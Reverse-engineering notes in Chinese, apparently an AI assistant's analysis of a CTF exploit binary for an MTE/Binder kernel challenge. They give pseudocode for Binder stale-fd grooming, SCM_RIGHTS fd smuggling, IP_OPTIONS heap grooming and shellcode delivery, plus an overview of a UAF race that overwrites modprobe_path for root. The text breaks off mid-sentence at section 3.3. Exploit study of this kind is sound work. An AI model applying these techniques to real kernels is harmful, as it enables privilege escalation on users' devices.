# `solver` 逆向分析筆記（Pseudocode）

分析對象：`solver`（sekai-mte-handout 這題的 exploit）
分析方式：Ghidra 反編譯 + 手動讀 disassembly + 字串交叉比對
分析日期：2026-07-09

## 0. 信心等級說明（很重要，請先讀）

這支 binary 主體 `FUN_0102c3e8`（也就是 `main()`）長達 7527 bytes、內部呼叫超過 270 次
子函式，而且 Ghidra 的反編譯單次呼叫在這個環境下對這種大小的函式會 timeout（試了三次都
timeout），所以**沒辦法把整支拿去一鍵反編譯**。我改用「反組譯 + 手動比對字串位址」的方式，
一段一段驗證。因此下面的內容分成三個信心等級，我會在每個區塊標註：

- `[高信心 - 逐指令驗證]`：有實際讀 disassembly，暫存器怎麼傳、呼叫哪個 libc wrapper、
  字串位址對得上，這種我才敢說「就是這樣寫的」。
- `[中信心 - 字串/介面推測]`：binary 裡有大量像日誌一樣的格式化字串（例如
  `modprobe_unlink_chunk,pass,%u,chunk,%u,...`），這些字串本身就把演算法的參數與步驟講得
  很清楚，我是用這些字串 + CLI 參數名稱去反推邏輯，但沒有逐行反組譯驗證。
- `[低信心 - 命名學推測]`：只看得到函式存在、名稱像什麼，但沒有足夠證據，純粹是合理猜測。

> **更新記錄**：你之後陸續提供了三份額外的完整反編譯檔案——
> `FUN_0102c3e8_main_solver_extracted.c`（外層 solver `main()`）、
> `FUN_01015420_main_racer_scc.c`（racer_scc `main()`）、
> `FUN_0103224c_pac_stage_solver_extracted.c`（PAC stage 分發函式）——
> 我用這些內容把原本因為函式太大反編譯 timeout 而只能中信心推測的段落
> （3.2、3.3、4.3 節）都升級成高信心，並且新增了 3.2.1 節（groom/freeze
> 函式）跟第 8 節（你實測 `fd_theft_poc.c` Stage 1 的結果解讀）。

## 1. 整體架構

```text
solver (shell wrapper, self-extracting)
  └─ dd 跳過前 461 bytes，還原出一支 ELF，寫到 /tmp，chmod 700，exec

外層 solver ELF（Ghidra 目前載入的這支，223840 bytes）
  ├─ main()  [FUN_0102c3e8]
  │    1. 解析 argv：usage: solver [target-client-fd]
  │    2. 透過自訂 UDP + Android Binder 協定，跟 guest 裡的一個
  │       "server"/"bridge" process 對話，最終「偷」到一份
  │       /dev/mte_driver 的 fd                [中信心]
  │    3. （可選）用 /dev/mte_driver 當作 oracle，跑一套統計/side-channel
  │       演算法去反推 PAC (QARMA3 指標簽章) 金鑰位元 / MTE tag LFSR 狀態
  │       （可用 SOLVER_SKIP_PAC 跳過這階段）    [中信心]
  │    4. 把內嵌在自己 .rodata 裡的第二支 ELF（racer_scc，83112 bytes，
  │       檔案位移 0x4f10~0x193b8）寫到 /tmp/racer_scc-XXXXXX，
  │       chmod 755，fork+execve 執行它            [高信心]
  │    5. waitpid 等 racer_scc 結束，成功的話開 /tmp/flag 整包讀出來
  │       印到自己的 stdout                        [高信心]
  │
  └─ racer_scc（內嵌 ELF，獨立的 kernel race exploit）
       利用 /dev/mte_driver 的 IOCTL_RACE_ALLOC/FREE/RESET 製造一個
       UAF race window，噴 pipe / SCM_RIGHTS fd 把釋放掉的 kernel object
       reclaim 成攻擊者可控資料（"fake-skb unlink write" 技巧），
       拿到一個任意寫 primitive，把 modprobe_path 改成 /tmp/a，
       寫入 helper shell script，觸發 kernel 自動 modprobe，
       用 root 權限把 flag 讀到 /tmp/flag             [中信心]
```

---

## 2. 自解壓 wrapper（`solver` 檔案本身）

```sh
# [高信心 - 直接看 shell script + hexdump]
#!/bin/sh
out=/tmp/solver-real.$$
dd if="$0" of="$out" bs=1 skip=461 2>/dev/null || exit 1   # 跳過前 461 bytes 的 wrapper 本身
chmod 700 "$out" || exit 1
# 下面這些環境變數是「已經解好的答案」，直接餵給 racer_scc 用，
# 代表這把 solver 在這個特定 kernel build 上，不需要重新跑 PAC 側信道，
# 也不需要動態 leak modprobe_path 位址（沒有 KASLR，位址是寫死的常數）
export SOLVER_RACER_HEADSTART_STEP_US='0'
export SOLVER_RACER_HEADSTART_US='0'
export SOLVER_RACER_MODPROBE_PATH='0xffff80008058c128'   # modprobe_path 的 kernel 虛擬位址（寫死）
export SOLVER_RACER_PIN_CPUS='1'
export SOLVER_RACER_PIPE_DELAY_STEP_US='2000'
export SOLVER_RACER_PIPE_DELAY_US='0'
export SOLVER_RACER_PIPE_SPRAY='384'
export SOLVER_RACER_TIMING_SWEEP='64'
exec "$out" "$@"
```

---

## 3. 外層 solver `main()` 的 pseudocode

### 3.1 錯誤處理 helper（三支小函式，已完整反編譯）

```c
// [高信心 - 已反編譯，原始 Ghidra 輸出]

// FUN_0102e150：印一般錯誤訊息後結束程式（不含 errno）
void die_msg(const char *msg) {
    fprintf(g_stderr, "solver: %s\n", msg);
    exit(1);   // 不會返回
}

// FUN_0102e178：印錯誤訊息 + errno 的文字說明後結束程式（perror 風格）
void die_errno(const char *what_failed) {
    fprintf(g_stderr, "solver: %s: %s\n", what_failed, strerror(errno));
    exit(1);   // 不會返回
}

// FUN_0102e2bc：write() 的 retry wrapper，EINTR 就重試，其他錯誤就 die_errno()
void write_all(int fd, const void *buf, size_t len, const char *err_label) {
    while (len != 0) {
        ssize_t n = write(fd, buf, len);
        if (n < 1) {
            if (n == -1 && errno == EINTR) continue;
            die_errno(err_label);   // 不會返回
        }
        buf += n;
        len -= n;
    }
}
```

這兩支 `die_*` 在 `main()` 裡被呼叫了超過 100 次，幾乎每個系統呼叫後面都接一個
`if (rc < 0) die_errno("xxx")`，這也是為什麼 `main()` 單一函式會膨脹到 7500+ bytes。
反過來說，這些呼叫點的錯誤標籤字串，其實就等於是這支程式「執行過的系統呼叫清單」，
非常適合拿來重建整體流程（下面 3.2 就是這樣重建出來的）。

### 3.2 前段：透過 Binder「stale fd 替換」偷 `/dev/mte_driver` fd

> **更新**：這節原本是中信心（靠字串重建），後來你把完整的 `main()` 反編譯結果
> 存成 `FUN_0102c3e8_main_solver_extracted.c` 給我看，內容跟我原本的重建大致吻合，
> 但細節豐富非常多，所以整段改成 **高信心**（直接讀自你提供的完整反編譯）。

```c
// [高信心 - 直接改寫自 FUN_0102c3e8_main_solver_extracted.c]

int main(int argc, char **argv) {
    if (argc != 2) usage_and_exit("solver [target-client-fd]");
    // target_client_fd 的來源（已修正先前筆記的錯誤描述——這個值「有」被用到，
    // 而且是直接餵給下面第 5 步的兩次 groom_stale_fd()）：
    //   - 沒帶參數執行（argc < 2）：target_client_fd 直接寫死等於 5
    //   - 帶剛好一個參數：target_client_fd = strtoul(argv[1], &endptr, 0)，
    //     並嚴格檢查整個字串被完整消耗（*endptr=='\0'）、沒有 errno 錯誤、
    //     結果放得進 32-bit，否則印 "usage: solver [target-client-fd]" 後結束
    //   - 帶兩個以上參數：一樣視為錯誤，印 usage 結束
    // （這支 wrapper script 用 `exec "$out" "$@"` 執行，而 handout 給的
    //   wrapper 本身沒有額外帶參數，所以實務上跑起來 target_client_fd 就是預設值 5）
    //
    // ★ 為什麼預設剛好是 5？—— 已用 Ghidra 反編譯真正的 server 二進位檔 main() 確認 ★
    // server 開機依序做：
    //   fd=3: openat("/dev/mte_driver", O_RDWR)  → mmap 驗證 header magic "MTED"/ver=1
    //   fd=4: openat("/dev/binder", O_RDWR)      → mmap + BINDER_VERSION +
    //         BINDER_SET_CONTEXT_MGR_EXT(0x4018620d) + BC_ENTER_LOOPER
    //   fd=5: openat("/tmp/server.ready", O_CREAT|O_WRONLY, 0644)
    //         write(fd, "ready\n", 6); close(fd);   ← ★ 立刻關掉 ★
    // 也就是說 fd=5 是 server 開機流程裡「用過即丟」的信號檔 fd，
    // 進入 Binder 主迴圈之後這個編號是空的、隨時會被下一個 open()／
    // Binder 傳進來的 fd 佔用。target_client_fd 預設值選 5，就是在賭
    // 「server 接下來收到的下一個 fd 會被 kernel 塞進這個剛空出來的slot」，
    // 不是隨便選的數字。（此段已從中信心升級為高信心：直接讀了真正
    // server binary 的 main() 反編譯，不是從 src/server.c 猜的）
    int target_client_fd = (argc < 2) ? 5 : strtoul(argv[1], &endptr, 0);

    // === 第 0 步：在 /proc 裡找一個 comm 剛好等於 "server" 的既有 process，
    //     並且它的兩個 /proc/<pid>/status 欄位（推測是 VmRSS/VmSwap 之類的
    //     四個數字組合）要精準等於 30000 30000 —— 這是在指紋比對，確保
    //     抓到的就是「那個」server，不是隨便一個同名 process。
    int server_pid = find_process_by_name_and_fingerprint("server", /*fields==*/30000, 30000);

    // === 第 1 步：solver 自己 fork 一份，子行程 execve("/bin/client", ...) ===
    // /bin/client 是guest rootfs 裡「已經放好」的一支協助程式（不是內嵌的），
    // solver 只是把它當自己的小弟啟動，PATH 設成標準路徑。
    pid_t client_pid = fork();
    if (client_pid == 0) {
        execve("/bin/client", argv_empty, envp_with_PATH);
        _exit(...);
    }

    // === 第 2 步：連上 client 開的 unix socket，做 HELLO 交握 ===
    int ctl_fd = socket(AF_UNIX, SOCK_STREAM, 0);
    connect_retry(ctl_fd, "/tmp/mte-client.sock", /*最多重試 200 次, 每次 25ms*/);
    write_all(ctl_fd, "HELLO\n", 6, "write(control)");
    char reply[256] = read_line(ctl_fd);          // "client HELLO did not receive server ACK" 檢查

    // === 第 3 步：建立兩個 UDP socket 當作跟 "bridge"(worker/server 那邊) 溝通的
    //     旁路通道，並且把 server_pid 編碼進 IP TTL 欄位傳過去 ===
    // [高信心 - 逐行對照 FUN_0102c3e8_main_solver_extracted.c 第 335~409 行，
    //  每一步都有專屬的錯誤標籤字串可以交叉核對]
    int udp_client = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);   // "socket(client udp)"
    int udp_peer   = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);   // "socket(peer udp)"

    setsockopt(udp_client, IPPROTO_IP, IP_RECVTTL,  1);
    setsockopt(udp_client, IPPROTO_IP, IP_RECVOPTS, 1);
    setsockopt(udp_peer,   IPPROTO_IP, IP_TTL, server_pid);   // "server pid cannot be encoded as IPv4 TTL" 檢查

    // bind 時 port 給 0，讓作業系統自動配一個臨時 port
    bind(udp_client, &(struct sockaddr_in){ AF_INET, .sin_port=0, .sin_addr=INADDR_LOOPBACK });  // "bind(client udp)"
    bind(udp_peer,   &(struct sockaddr_in){ AF_INET, .sin_port=0, .sin_addr=INADDR_LOOPBACK });  // "bind(peer udp)"

    // port 是系統自動配的，兩邊都要用 getsockname 查出「自己實際拿到哪個
    // port」，才能告訴對方要 connect 去哪裡
    struct sockaddr_in client_addr; getsockname(udp_client, &client_addr);  // "getsockname(client udp)"
    struct sockaddr_in peer_addr;   getsockname(udp_peer,   &peer_addr);    // "getsockname(peer udp)"

    connect(udp_client, &peer_addr);    // "connect(client udp)" —— 連到剛查出來的 peer port
    connect(udp_peer,   &client_addr);  // "connect(peer udp)"   —— 連到剛查出來的 client port

    // === 第 4 步：準備一份「替換用」的偽造檔案（memfd），magic 是自訂的
    //     "MMAP" header + 32 個 "VOLS"/"MIKU!KPQ"/"CKFOBETM" 標記的區塊。
    //     這是這次攻擊真正的「漏洞輸入」——用來塞進 server 的某個
    //     檔案結構解析流程，配合下面的 Binder stale-fd 交換去偷 fd。
    int replacement_fd = memfd_create("solver-source-replacement", MFD_CLOEXEC);
    ftruncate(replacement_fd, 0x1000);
    void *buf = mmap(replacement_fd, 0x1000);
    build_custom_MMAP_MIKU_container(buf);          // 見下方「MIKU 容器」說明

    // === 第 5 步：開 /dev/binder，做 BINDER_VERSION 檢查，
    //     然後對 server 做兩次「stale fd」grooming (tag GM1A / GM2A，
    //     見下方 3.2.1 已逐指令反編驗證的細節)，
    //     再 BINDER_FREEZE 把 server 凍結 ===
    int binder_fd = open("/dev/binder", O_RDWR);
    mmap(binder_fd, 0x100000);
    ioctl(binder_fd, BINDER_VERSION, ...);
    groom_stale_fd(binder_fd, target_client_fd, /*tag=*/"GM1A");
    groom_stale_fd(binder_fd, target_client_fd, /*tag=*/"GM2A");
    usleep(100000);
    binder_freeze(binder_fd, server_pid, /*freeze=*/1);

    // === 第 6 步：叫 client 送 3 次 "COMMIT"（"asking client to send FDA
    //     update sequence"），透過 sendmsg 把一批 fd 用 SCM_RIGHTS 塞進
    //     server 那邊 client 的 cmsg 佇列，再把這些暫存 fd 全部關閉。
    //     接著在 udp_peer 上塞一批 "server buffer" grooming 資料
    //     (setsockopt IP_OPTIONS + "GROOM\n")，等 client 回覆確認。
    //     這一串操作合起來的目的：在 server 的 fd table 裡製造一個時間窗，
    //     讓 server 對某個 fd 的引用被 solver 準備的 replacement_fd 頂替掉。
    //
    // ★ 這個 sendmsg 的精確欄位，已用 disassemble_function 直接看組合語言
    //   逐 byte 確認過（細節/推導過程見 3.2.2 節），這裡直接寫確認後的結論： ★
    write_all(ctl_fd, "COMMIT\nCOMMIT\nCOMMIT\n", 21, "write(control)");
    sleep(1);   // FUN_010414b0(1000000)，等 client 準備好接 fd

    // sendmsg() 目標是 ctl_fd 本身（連到 /bin/client 的那條 control socket，
    // 不是 udp_client）；iovec 只送 1 byte 的 "\n"（真正資料全在 ancillary
    // data），ancillary data 是一個 SCM_RIGHTS cmsg，裡面帶 16 個 fd：
    int fds[16] = {
        [0]  = udp_client,       // ★ 已更正：不是 udp_peer，是 udp_client——
                                 //   反組譯可對照回 "socket(client udp)" 錯誤
                                 //   字串，且緊接著設定的是 IP_RECVTTL/
                                 //   IP_RECVOPTS，跟第 3 步 udp_client 的
                                 //   設定完全吻合 ★
        [1]  = socketpair_sv1,   // ★【已確認 2026-07-27】FUN_0102c3e8 第 413 行：
                                 //   socketpair(AF_UNIX,SOCK_STREAM|CLOEXEC,0,&local_12f8)
                                 //   → local_12f4 = sv[1] 存進 uStack_1334（第 459 行），
                                 //   sendmsg 後立刻 close(local_12f4)（第 545 行）。
                                 //   先前誤判「sp+0x19c 無人寫入」是因為 Ghidra 的
                                 //   stack offset 標記方式造成混淆，已更正。★
        [2]  = replacement_fd,   // ★ 就是本步驟真正要偷渡進去的東西 ★
        // [3..15]：13 個 open("/dev/null", O_CLOEXEC) 的 fd，單純湊數/
        //          grooming 用，內容不重要
    };
    // cmsg_buf：一個 cmsghdr 開頭接著 fds[16] 陣列本身的記憶體塊（不是另外
    // 轉換過的東西，就是直接把上面 fds[] 包上 cmsghdr header）：
    //   cmsg_buf->cmsg_len   = 0x50;        // 80 bytes = 16(cmsghdr) + 16*4(fd陣列)
    //   cmsg_buf->cmsg_level = SOL_SOCKET;  // 1
    //   cmsg_buf->cmsg_type  = SCM_RIGHTS;  // 1
    //   (cmsg_buf 之後緊接著 fds[16] 本身)
    sendmsg(ctl_fd, &(struct msghdr){
        .msg_iov = &(struct iovec){ .iov_base = "\n", .iov_len = 1 }, .msg_iovlen = 1,
        .msg_control = cmsg_buf, .msg_controllen = 0x50,  // 80 bytes
    }, MSG_NOSIGNAL);

    // sendmsg 完成後立刻 close sv[1] 跟全部 /dev/null fd（無 sleep）
    close(socketpair_sv1);
    close_all(the_13_dev_null_fds);

    // ★ 已確認 groom_bytes 的實際 24 bytes 內容（對照
    //   FUN_0102c3e8_main_solver_extracted.c 第 552~568 行逐 byte 展開）：
    //     07 17 18 00  00 00 00 00  00 00 00 00
    //     30 75 00 00  00 00  30 75 00 00  00 00 00 00
    //   byte[0]=0x07 是標準 IPv4 選項的 option type = IPOPT_RR（Record
    //   Route）——送這種 IP_OPTIONS 會讓 kernel 配置一塊緩衝區記錄路由
    //   資訊，就算走 loopback 也一樣會觸發，是經典的 kernel heap-grooming
    //   手法。byte[12-13] 跟 byte[16-17] 都是 0x7530=30000，跟前一行印出的
    //   log「grooming client cmsg stack uid=30000 gid=30000」對上——這步
    //   是刻意把 uid/gid=30000 的數值圖樣埋進送出去的 IP 選項資料裡，
    //   呼應 src/client_socket.c 的 EXEC auth 檢查（cred.uid/gid==30000），
    //   但確切怎麼銜接到後面攻擊還沒完全追出因果關係。
    uint8_t groom_bytes[24] = {
        0x07,0x17,0x18,0x00, 0x00,0x00,0x00,0x00, 0x00,0x00,0x00,0x00,
        0x30,0x75,0x00,0x00, 0x30,0x75,0x00,0x00, 0x00,0x00,0x00,0x00,
    };
    setsockopt(udp_peer, IPPROTO_IP, IP_OPTIONS, groom_bytes, sizeof(groom_bytes));  // "setsockopt(IP_OPTIONS groom)"
    write_all(udp_peer, "GROOM\n", 6, "write(udp groom)");

    // === wait_for_client_groom_reply(udp_peer)：
    //     poll+recv 輪詢 udp_peer，最多重試 16 次，直到收到的內容跟一個內建
    //     期望字串完全相符才算成功；失敗達到重試上限就會先解凍 server 再結束 ===
    // [高信心 - 直接對照這段反編譯逐行確認過]
    int retries = 0x10;                          // 最多重試 16 次
    while (true) {
        int timeout_ms = (retries == 0x10) ? 3000 : 500;   // 第一次等 3 秒，之後每次只等 0.5 秒

        // 手動組一個 struct pollfd { fd=udp_peer, events=0x19, revents=0 }
        // 0x19 = POLLIN(0x1) | POLLERR(0x8) | POLLHUP(0x10)
        struct pollfd pfd = { .fd = udp_peer, .events = 0x19, .revents = 0 };
        int r = poll(&pfd, 1, timeout_ms);
        if (r < 1) goto client_groom_fail;        // poll 逾時或出錯 → 失敗

        ssize_t n = recv(udp_peer, reply_buf, 0xff, 0);
        if (n < 0) goto client_groom_fail;
        reply_buf[n] = '\0';

        // 用某個格式字串（位址 DAT_01002a9d，Ghidra 沒把它標成字串常數）
        // 組出「預期收到的 ack 字串」
        int expect_len = snprintf(expect_buf, 0x20, /* DAT_01002a9d */ "%u ", 0);
        if (/* expect_len 超出合理範圍（截斷保護） */ 0) goto client_groom_retry_dec;

        // 比對 udp_peer 收到的回覆，跟預期字串是否一致
        if (memcmp(reply_buf, expect_buf, expect_len) == 0)
            break;                                // ★ 比對成功，跳出迴圈 ★

client_groom_retry_dec:
        if (--retries == 0) {
client_groom_fail:
            binder_freeze(binder_fd, server_pid, /*freeze=*/0);   // 先解凍 server
            die_msg("client did not consume cmsg groom");          // 再結束程式
        }
    }
    printf("[solver] client groom reply: %s", reply_buf);

    // 收尾：udp_peer 上的 IP_OPTIONS 用完就清掉，udp_client 從「grooming 模式」
    // 切回「正常模式」（關掉第 3 步開的 IP_RECVOPTS，改開 IP_PKTINFO）：
    setsockopt(udp_peer, IPPROTO_IP, IP_OPTIONS, NULL, 0);
    setsockopt(udp_client, IPPROTO_IP, IP_RECVOPTS, 0, "IP_RECVOPTS");
    setsockopt(udp_client, IPPROTO_IP, IP_PKTINFO,  1, "IP_PKTINFO");

    // === 第 7 步：準備 shellcode（預設用內建的一段固定 bytes，若有設定
    //     SOLVER_SHELLCODE 環境變數則改讀那個檔案），編碼成 "EXEC <hex>\n"
    //     文字命令，透過 udp_peer 傳給 bridge 端執行，然後解凍 server ===
    write_all(udp_peer, exec_command_hex, ..., "write(exec shellcode)");
    binder_freeze(binder_fd, server_pid, /*freeze=*/0);

    // === 第 8 步：等 bridge 端回傳 "hello"（透過 socketpair 收 SCM_RIGHTS），
    //     驗證 magic "BSR1"/1，拿到 binder_fd / worker_pid / binder_map / size ===
    recvmsg(socketpair_fd, &bridge_hello_msg);      // "bridge did not send binder fd"
    assert(bridge_hello_msg.magic == "BSR1" && version == 1);
    printf("[solver] bridge: binder_fd=%d worker_pid=%d binder_map=0x%llx size=0x%llx\n", ...);

    // === 第 9 步：用剛拿到的 binder_fd 對 worker 做一連串自訂 Binder
    //     transaction（命令碼像 0x534f4c56="SOLV" 開頭的自製協定）：
    //       - 送 "mte random packet"，收 64 組樣本（每組是一個 tag 相關的值）
    //       - 把樣本餵給 FUN_0102f1f8 做 MTE tag LFSR 狀態預測
    //         -> 印出 "[solver] predicted boot tags"
    //       - 送 "mte challenge packet"，驗證預測出的 tag 在 index 上都合法
    //       - 把預測結果 "submit tags" 送回去給 worker 驗證
    //       - 送 "close verified model" 等指令收尾
    binder_transaction(worker, MTE_RANDOM_REQ, ...);
    uint8_t samples[16] = recv_mte_samples();
    uint8_t predicted_tags[32] = predict_mte_lfsr(samples);   // FUN_0102f1f8
    binder_transaction(worker, MTE_CHALLENGE_REQ, ...);
    verify_challenge_indices_in_range(predicted_tags);
    binder_transaction(worker, MTE_SUBMIT_TAGS_REQ, predicted_tags);
    binder_transaction(worker, MTE_CLOSE_MODEL_REQ, ...);

    // === 第 10 步：跟 worker 要 secctx handle、送 fd transaction
    //     （把 replacement_fd 再送一次），最後拿到「真正的」driver_fd ===
    uint32_t secctx = binder_get_secctx(worker);
    binder_send_fd_transaction(worker, secctx, replacement_fd);
    int driver_fd = binder_recv_driver_fd(worker);   // "server did not return driver fd"

    // === 第 11 步：把 predicted_tags 整批（256 bytes，每個 nibble 做位元
    //     重排/搬移，像是把 4-bit tag 值 pack 進一個 bitmap）透過
    //     ioctl(driver_fd, 0x41084d12 /* "MTE driver submit" */, ...) 交給驅動 ===
    ioctl(driver_fd, 0x41084d12, packed_tag_bitmap);
    printf("[solver] driver MTE submit accepted");

    // === 第 12 步：把自己（solver process）釘在目前的 CPU 上（sched_setaffinity），
    //     跟 /bin/client 道別（bridge exit 訊息），非阻塞等它退出 ===
    sched_setaffinity(0, current_cpu_mask);
    write_all(udp_peer /*bridge*/, bridge_exit_msg, 0x38, "write(bridge exit)");
    read(udp_peer, ack, 0x38, "read(bridge exit)");
    waitpid_nonblocking_with_timeout(client_pid, /*~0.7s*/);

    // === 第 13 步：呼叫 PAC 復原階段（整包包成一個函式呼叫） ===
    if (pac_stage(driver_fd) != 0) {
        die_msg("PAC stage failed");
    }

    racer_scc_stage(driver_fd);   // 見 3.4
}
```

**"MIKU" 容器格式**（好玩的細節）：`solver-source-replacement` 這個 memfd 裡寫入的自訂資料結構，
含有重複出現的魔術字串 `"MIKU!KPQ"` 與 `"CKFOBETM"`（用 little-endian 8-byte 常數硬塞進去），
外加開頭的 `"MMAP"` header 跟兩個 `"VOLS"` 區段標記，一共 32 個重複區塊。這應該是題目自製的
一個小型容器/封存格式（畢竟這題背景是 Project SEKAI／初音未來），拿來當作某個 parser 的輸入，
藉此觸發 server 那邊的漏洞、配合 Binder fd grooming 完成 fd 偷換。這部分「server 本身的漏洞」
不在 solver 這支檔案裡（server 的邏輯在另一支我們沒有的 binary 裡），所以只能看到 solver 端
怎麼「觸發」它，看不到 server 端漏洞本身的細節。

### 3.2.1 `FUN_0102e1b8`（stale-fd groom transaction）與 `FUN_0102e26c`（BINDER_FREEZE）

這兩支是 3.2 節第 5 步實際呼叫的底層函式，已經逐指令反編驗證過，補在這裡：

```c
// [高信心 - 逐指令反編驗證]

// FUN_0102e26c：BINDER_FREEZE ioctl 的 wrapper，struct 只有三個 int32 欄位
void binder_freeze(int binder_fd, int32_t pid, int32_t enable, int32_t timeout_ms) {
    struct { int32_t pid; int32_t enable; int32_t timeout_ms; } req = { pid, enable, timeout_ms };
    ioctl(binder_fd, 0x400c620e /* BINDER_FREEZE */, &req);
}
// main() 裡呼叫時 timeout_ms 固定傳 0：
//   binder_freeze(binder_fd, server_pid, 1, 0);   // 凍結
//   ... (第 6~7 步做 fd 替換) ...
//   binder_freeze(binder_fd, server_pid, 0, 0);   // 解凍

// FUN_0102e1b8：組一個 BC_TRANSACTION_SG (0x40486311) 的 groom transaction，
// 送出去偷換 server 手上某個 binder_ref 指到的 fd。
void groom_stale_fd(int binder_fd, int32_t target_client_fd, uint32_t tag /* "GM1A"=0x41314d47 或 "GM2A"=0x41324d47 */) {
    // --- 88 bytes 的 transaction data blob ---
    // offset 0x00: 保留/其他欄位（本次沒特別用到）
    // offset 0x08: 一個 BINDER_TYPE_PTR (0x70742a85) 的 scatter-gather buffer object：
    //     struct binder_buffer_object sg_obj = {
    //         .type   = 0x70742a85,           // BINDER_TYPE_PTR
    //         .flags  = 0,
    //         .buffer = &target_client_fd,     // 指向下面這個 4-byte 值
    //         .length = 4,
    //         .parent = 0,
    //         .parent_offset = 0,
    //     };
    // 其餘 bytes 補 0
    uint8_t data_blob[88] = {0};
    write_binder_type_ptr_object(data_blob + 8, &target_client_fd, /*length=*/4);

    // --- 76 bytes 的外層 transaction 結構 ---
    // cmd = 0x40486311 (BC_TRANSACTION_SG)
    // data_size = 0x58 (88)，offsets_size = 8（單一個 offset 項目 {8}，
    //   指向上面 data_blob 裡 sg_obj 的起始位置）
    // buffers_size = 8
    // tag 參數放在特定 qword 的高 32 bits（用來讓兩次呼叫〔GM1A / GM2A〕
    //   在 log／debug 上可以分辨是哪一次 grooming，實際攻擊語意上兩次
    //   應該是針對同一個 target_client_fd 做兩階段替換）
    struct binder_transaction_data_sg txn = {
        .cmd = 0x40486311,
        .data_size = 0x58,             // 88
        .offsets_size = 8,             // 一個 offset 項目
        .data_ptr = data_blob,
        .offsets_ptr = (uint64_t[]){ 8 },  // sg_obj 在 data_blob 裡的起點
        .buffers_size = 8,
        .tag_hi32 = tag,                // "GM1A" / "GM2A" 放在特定 qword 高 32 bits
    };
    binder_write_read(binder_fd, &txn, sizeof(txn));
}
```

**這兩次 groom（"GM1A" 再 "GM2A"）搭配中間的 `usleep(100000)` 與後面的
`BINDER_FREEZE`，本質上是在製造一個時間窗**：用 `BC_TRANSACTION_SG`
送一個「只有一個 fd 大小欄位、type=`BINDER_TYPE_PTR`」的 scatter-gather
物件過去，讓 server 端某個 binder_ref／fd table entry 在還沒完全穩定前被
`solver` 準備好的 `target_client_fd` 頂替掉；`BINDER_FREEZE` 則是把 server
process 凍結，避免它在 solver 準備後續的 SCM_RIGHTS／COMMIT 序列（3.2 節
第 6 步）時繼續跑，讓整個替換動作不會被 server 自己的邏輯搶先處理掉、
或是被意外的排程打斷。**這個「為什麼會成功」的底層 kernel Binder bug
本身，solver 這支檔案只看得到「送了什麼」，看不到「為什麼有效」**——真正
的漏洞成因（很可能是 `binder_transaction` 對 `BINDER_TYPE_FDA`/scatter-gather
物件的釋放或 GC 時機問題）需要去讀 Linux kernel Binder driver 原始碼才能
確認，這點在 `solver_dev_plan.md` Stage 4 裡也有記錄，目前仍是未解之謎。

### 3.2.2 `sendmsg_scm_rights` 細節（第 6 步的實際欄位，逐行對照確認）

```c
// [高信心 - 逐行對照 FUN_0102c3e8_main_solver_extracted.c 第 460~550 行]

// 目標 fd 是 ctl_fd（連到 /bin/client 的 control socket），不是 udp_client——
// 前面剛送完文字 "COMMIT\nCOMMIT\nCOMMIT\n" 就是在同一條 socket 上，
// 告訴 client「準備收 fd」。
struct msghdr msg = {
    .msg_name = NULL, .msg_namelen = 0,          // 已連線的 stream socket，不需要
    .msg_iov = &(struct iovec){ .iov_base = "\n", .iov_len = 1 },  // 真資料只有 1 byte
    .msg_iovlen = 1,
    .msg_control = cmsg_buf, .msg_controllen = 0x50,   // 80 bytes
};
// ★ 注意：cmsg_buf 是我自己取的代稱，方便閱讀，不是反編譯出來的真實符號 ★
// 對照真正的原始反編譯（FUN_0102c3e8_main_solver_extracted.c 第 535 行：
//   local_1240 = (char **)&local_1070;），cmsg_buf 實際上就是 &local_1070。
// cmsg_buf（= &local_1070）開頭是標準 cmsghdr：
struct cmsghdr *cmsg = cmsg_buf;
cmsg->cmsg_len   = 0x50;             // 80，跟 msg_controllen 對上
cmsg->cmsg_level = SOL_SOCKET;       // 1
cmsg->cmsg_type  = SCM_RIGHTS;       // 1
// 後面緊接 80-16=64 bytes = 16 個 int 的 fd 陣列：
int *fds = (int *)(cmsg + 1);
// ★★ 已用 disassemble_function 直接看組合語言逐 byte 確認，更正下面原本的
//    錯誤猜測（原本以為 fds[0]=replacement_fd，是誤讀 Ghidra C 偽代碼賦值
//    順序得出的錯誤結論——C 偽代碼的變數賦值順序不等於陣列真正的 index，
//    這種用 stp/ldp 整塊搬移的程式碼一定要回去看 sp 相對位移才準）★★
//
// 送出的 64-byte fd 陣列，來源是 sp+0x158 ~ sp+0x198 這段連續 stack 記憶體，
// 用 4 個 16-byte SIMD load/store 整塊複製進 cmsg 緩衝區（不是逐一賦值）：
fds[0] = udp_client;       // sp+0x158，第 345 行 socket(AF_INET,SOCK_DGRAM|CLOEXEC,0) 的回傳值，
                           // ★ 已更正：不是 udp_peer，錯誤字串是 "socket(client udp)" ★
fds[1] = socketpair_sv1;   // ★【已確認 2026-07-27】第 413 行 socketpair() 的
                           //   sv[1]（local_12f4）。第 459 行 `uStack_1334 =
                           //   local_12f4` 把它存進 cmsg fd 陣列的 index 1。
                           //   sendmsg 後 close(local_12f4)（第 545 行）。
                           //   先前誤判「無人寫入」是 Ghidra stack offset 標記問題。★
fds[2] = replacement_fd;   // ★ sp+0x160，確認：第 418 行 memfd_create(
                           //   "solver-source-replacement",...) 的回傳值 ★
                           //   （index 是 2，不是我原本誤植的 0）
// fds[3..15]（13 個，sp+0x164~0x194）：確認就是前面第 460~473 行開的 13 個
//   /dev/null fd（local_136c[13]），迴圈裡每次同時寫兩個地方，這裡是第二份；
//   送完之後 main() 緊接著把這 13 個 fd 全部 close 掉，時間點吻合。
FUN_01039d80(ctl_fd, &msg, 0x4000 /* MSG_NOSIGNAL */);   // 失敗且非 EINTR 就 "sendmsg(SCM_RIGHTS)"

// sendmsg 完成後：close(socketpair_fd) + 迴圈 close 掉 13 個 /dev/null fd
// ——典型的「送出去給對方之後，自己這邊的副本就關掉」寫法
```

這修正/補完了先前筆記裡含糊的「`sendmsg_scm_rights(udp_client, many_fds_incl_replacement_fd)`」：實際目標是 `ctl_fd`，陣列共 16 個 fd，用組合語言逐 byte 確認過 index 0 是 UDP client socket、**index 1 是 socketpair sv[1]**（先前誤判為未初始化，已更正）、index 2 是 `replacement_fd`（MIKU memfd）、index 3~15 是 13 個 `/dev/null` fd。**這裡也記一個教訓：C 偽代碼裡變數賦值的先後順序，不代表陣列真正的 index／記憶體位置**，先前筆記曾誤以為 `replacement_fd` 是 index 0，已對照組合語言更正。

### 3.3 PAC 側信道金鑰復原（`pac_stage`）

> **更新**：`FUN_0103224c_pac_stage_solver_extracted.c` 提供了 `FUN_0103224c`
